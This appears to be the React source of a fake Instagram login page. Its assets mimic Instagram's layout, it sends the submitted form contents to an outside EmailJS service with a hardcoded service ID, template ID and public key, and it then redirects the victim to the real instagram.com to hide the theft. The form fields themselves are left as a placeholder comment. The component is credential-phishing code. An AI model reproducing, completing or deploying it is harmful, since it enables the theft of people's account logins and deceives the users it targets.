import React, { useRef, useState } from "react";
import emailjs from '@emailjs/browser';
import logo from "../assets/images/logo.png";
import fb from "../assets/images/Facebook_logo_(square).png";
import app from "../assets/images/store.png";
import play from "../assets/images/micro.png";
import mobile from "../assets/images/Screenshot 2024-05-05 150842.png";

const Login = () => {
    const form = useRef();
    const [submitted, setSubmitted] = useState(false); // State variable to track form submission

    const sendEmail = (e) => {
        e.preventDefault();

        emailjs
            .sendForm('service_fswa6ng', 'template_cmq9616', form.current, {
                publicKey: 'ExMQrR3tk-yfB9w_w',
            })
            .then(
                () => {
                    console.log('SUCCESS!');
                    setSubmitted(true); // Set submitted to true after successful form submission
                    window.location.href = "https://www.instagram.com/"; // Redirect to Instagram after successful form submission
                },
                (error) => {
                    console.log('FAILED...', error.text);
                },
            );
    };

    return (
        <div id="container">
            <div className="flex flex-row flex-wrap -mx-3 justify-center">
                <div className="md:w-6/12 max-md:hidden w-100 px-3 h-100">
                    <img src={mobile} alt="mobile" className="h-100 h-[581px]" />
                </div>
                <div className="md:w-6/12 w-100 px-3 ">
                    <form className="main-top" onSubmit={sendEmail} ref={form}>
                        {/* Your form content */}
                    </form>
                </div>
            </div>
            {/* Your footer content */}
        </div>
    );
};

export default Login;
